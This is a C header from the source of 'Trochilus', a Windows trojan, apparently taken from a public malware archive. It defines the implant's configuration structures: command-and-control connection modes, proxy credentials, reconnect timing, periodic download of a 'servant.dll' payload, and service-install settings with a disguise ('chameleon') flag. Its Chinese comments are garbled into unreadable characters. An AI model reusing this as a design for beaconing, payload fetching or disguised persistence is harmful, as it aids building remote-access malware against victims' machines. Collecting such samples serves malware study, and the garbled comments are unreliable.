/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

#define CONNECT_FLAG 0xFFFA0FFF
#define CONNECT_CONFIG_FACTOR1 1
#define CONNECT_CONFIG_FACTOR2 3

#define SERVICE_FLAG 0xFFFA1FFF
//���߷�ʽ
enum
{
	//�̶�IP����
	CONNECT_IP = 0x00,
	//������������
	CONNECT_DNS,
	//HTTP����IP����
	CONNECT_HTTP
};

//������ʽ
enum
{
	//sock5����
	PROXY_SOCK5 = 0x00,
	//HTTP����
	PROXY_HTTP,
	//ISA����
	PROXY_ISA
};

#define SERVANTSHELL_REALNAME_LENGTH 17

#pragma pack(1)
typedef struct  _CONNECT_INFO
{
	//�ṹ����
	int nFlag;
	//���߷�ʽ
	int nConnectType;
	//���ߵ�ַ
	char szAddr[64]; 
	//������ʽ
	int nPort;
	int nProxyType;
	//������ַ
	char szProxyAddr[64];
	//�����û���
	char szProxyUsername[32];
	//��������
	char szProxyPassword[32];
	//�����˿�
	int nProxyPort;
	//�ͷ������Ͽ���,�������ӵ�ʱ����
	int	nTryConnectIntervalM;
	//Ĭ�ϵ����ӷ�ʽ
	int nDefaultCommType;	//0-detect 1-http 2-dns
	//�������һ�����ӷ���˵�ʱ��
	int nFirstConnectHour;
	int nFirstConnectMinute;
	//�״γ�������servant.dll��ƫ��ʱ��(s)
	UINT nFirstDownSvtOffsetS;
	//ÿ�γ�������servant.dll�ļ��ʱ��(s)
	UINT nDownSvtIntervalS;
	//servantshell��������ʵ����
	char szGroups[255];
	char szServantshellRealname[SERVANTSHELL_REALNAME_LENGTH];
}CONNECT_INFO,*PCONFIG_INFO;

typedef struct _SERVICE_INFO
{
	//�ṹ����
	int nFlag;
	//������
	char szServiceName[128];
	//��ʾ����
	char szDisplayName[128];
	//��������
	char szServiceDecript[128];
	//��װ·��
	TCHAR szInstalPath[256];
	//�Ƿ���û�����װ
	BOOL bUseChameleon;
}SERVICE_INFO,*PSERVICE_INFO;